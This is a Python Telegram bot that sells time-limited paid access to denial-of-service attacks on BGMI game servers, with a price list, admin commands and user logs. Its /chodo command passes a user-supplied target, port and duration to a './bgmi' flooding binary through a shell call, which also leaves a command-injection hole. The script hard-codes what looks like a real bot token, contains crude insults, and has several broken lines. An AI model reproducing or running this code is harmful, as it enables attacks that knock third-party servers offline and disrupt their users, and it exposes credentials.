import telebot
import subprocess
import datetime
import os
from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7784339491:AAFKRrGNcJrQ4z6N1449ok5_TJwrkJsOwjA')

# Admin user IDs
admin_id = {"7083378335", "1436507974", "6925561335" , "7031864464"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\ntarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
            else:
                file.truncate(0)
                response = "log saaf ho gae "
    except FileNotFoundError:
        response = "Saaf karane ke lie koee Log nahin mila."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Thik se daal bsdk. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
    else:
        response = "Mood ni hai abhi pelhe purchase kar isse:- none."

    bot.reply_to(message , response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f" Your Info:\n\n User ID: <code>{user_id}</code>\n Username: {username}\n Role: {user_role}\n Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully ."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Purchase karle bsdk:- none ."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strtarget() == "":
                    response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
                else:
                    file.truncate(0)
                    response = "log saaf ho gae "
        except FileNotFoundError:
            response = "Saaf karane ke lie koee Log nahin mila ."
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "KOI DATA NHI HAI "
        except FileNotFoundError:
            response = "KOI DATA NHI HAI "
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "KOI DATA NHI HAI ."
                bot.reply_to(message, response)
        else:
            response = "KOI DATA NHI HAI "
            bot.reply_to(message, response)
    else:
        response = "BhenChod Owner na HAI TU LODE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"ATTACK start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahi Dalna"
    bot.reply_to(message, response)

    # Dictionary to store the last time each user ran the /chodo command
bgmi_cooldown = {}

COOLDOWN_TIME =3

attack_running = False

# Handler for /attack command
@bot.message_handler(commands=['chodo'])
def handle_attack(message):
    global attack_running

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Abhi attack chal rha ha wait karo voo attack khatam hoga then tumhara attack laga ga."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer

            if time > 240:
                response = "Error: Time interval must be less than 240"
            else:
                attack_running = True  # Set the attack state to running
                try:
                    record_command_logs(user_id, '/chodo', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)

                    # Simulate attack process
                    full_command = f"./bgmi {target} {port} {time} 24 1000"
                    subprocess.run(full_command, shell=True)

                    response = "Attack completed successfully."
                except Exception as e:
                    response = f"Error during attack: {str(e)}"
                finally:
                    attack_running = False  # Reset the attack state
        else:
            response = "Usage: /chodo <target> <port> <time>"
    else:
        response = "ACCESS TOH LELE FREE mai kuch nahi milega FREE mai shrif ghnta milega lega toh bata ."

    bot.reply_to(message, response)




# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Pehle Buy krke Aao ❌ ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
💥 /chodo : 😫BGMI WALO KE SERVER KO CHODO🥵. 
💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
💥 /plan : 💵SABKE BSS KA BAT HAI💵.
💥 /myinfo : 📃APNE PLAN KI VEDHTA DEKHLE LODE📃.

👀 To See Admin Commands:
🤖 /admincmd : Shows All Admin Commands.

Buy From :- none
Official Channel :- na
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''SERVER HACK pe aapka swagat hai, {user_name}! Sabse acche se bgmi ke server yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
🤗Try To Run This Command : /help 
💵BUY :- none'''
    bot.reply_to(message),
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules :

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED na OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Ye plan hi kafi hai bgmi ke server ke liye!!:

VIP  :
-> Attack Time :  (S)
> After Attack Limit :10 sec
-> Concurrents Attack : 5

Pr-ice List :
Day-->150 Rs
3Day-->300 Rs
Week-->600 Rs
Month-->1500 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

➕ /add <userId> : Add a User.
🖕 /remove <userid> Remove a User.
📒 /allusers : Authorised Users Lists.
📃 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "Owner na ho tum."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        
